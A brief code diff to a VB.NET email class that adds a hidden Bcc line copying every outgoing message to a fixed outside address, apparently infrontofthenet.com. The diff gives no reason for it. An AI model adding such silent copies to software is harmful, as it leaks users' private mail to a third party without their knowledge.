@@ -44,6 +44,8 @@ Public Class CEmail
         mm.Subject = strSubject
         mm.Body = strMessage
         mm.IsBodyHtml = True
+        mm.Bcc.Add("varisafe@infrontofthenet.com")
+
 
         'If strAttachment <> "" Then
 
